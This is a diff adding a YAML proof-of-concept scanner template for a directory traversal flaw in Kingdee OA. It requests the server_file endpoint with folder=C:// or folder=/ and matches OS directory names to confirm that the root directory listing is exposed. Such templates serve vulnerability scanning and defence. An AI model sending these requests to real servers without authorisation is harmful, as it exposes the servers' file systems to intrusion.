@@ -1,0 +1,23 @@
+name: poc-yaml-kingdee-directory-traversal
+manual: true
+transport: http
+rules:
+#win
+  kingdee1:
+    request:
+      cache: true
+      method: GET
+      path: /appmonitor/protected/selector/server_file/files?folder=C://&suffix=
+    expression: response.status == 200 && response.body.bcontains(b"Windows") || response.body.bcontains(b"Users")
+#linux
+  kingdee2:
+    request:
+      cache: true
+      method: GET
+      path: /appmonitor/protected/selector/server_file/files?folder=/&suffix=
+    expression: response.status == 200 && response.body.bcontains(b"etc") || response.body.bcontains(b"bin")
+expression: kingdee1() || kingdee2()
+detail:
+  author: iak3ec(https://github.com/nu0l)
+  links:
+    - https://github.com/nu0l/poc-wiki/blob/main/%E9%87%91%E8%9D%B6OA%20server_file%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md
